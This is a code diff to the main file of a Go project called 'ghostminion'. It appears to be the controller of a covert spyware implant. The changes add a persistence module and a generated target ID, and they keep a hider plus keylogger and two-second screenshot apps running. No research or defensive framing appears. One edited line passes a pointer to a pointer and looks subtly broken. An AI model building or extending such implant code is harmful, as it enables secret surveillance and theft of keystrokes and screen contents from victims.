@@ -1,17 +1,19 @@
 package main
 
 import (
+	"fmt"
 	"ghostminion/apps"
 	"ghostminion/config"
 	"ghostminion/db"
 	"ghostminion/hider"
+	"ghostminion/persistence"
 	"log"
 	"sync"
 )
 
 func main() {
 	var wg sync.WaitGroup
-	wg.Add(1) // for run app
+	wg.Add(1) // for "run" function
 
 	configInstance, err := config.LoadConfig("../config.yaml") //get from configPath
 	if err != nil {
@@ -28,7 +30,11 @@ func main() {
 		panic(err)
 	}
 
-	appManager := apps.NewAppManager()
+	targetId := persistence.GenerateTargetID()
+	fmt.Println("targetId:", targetId)
+
+	appManager := apps.GetAppManagerInstance()
+
 	addBuiltinApps(appManager)
 	appManager.StartAll(&wg)
 
@@ -50,8 +56,11 @@ func addBuiltinApps(am *apps.AppManager) {
 	am.AddApp("keylogger", &apps.KeyLoggerApp{})
 	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2})
 	securityGuard := &apps.SecurityGuardApp{}
-	securityGuard.Validate()
-	am.AddApp("security_guard", securityGuard)
+	err := securityGuard.Validate()
+	if err != nil {
+		return
+	}
+	am.AddApp("security_guard", &securityGuard)
 }
 
 func run() {
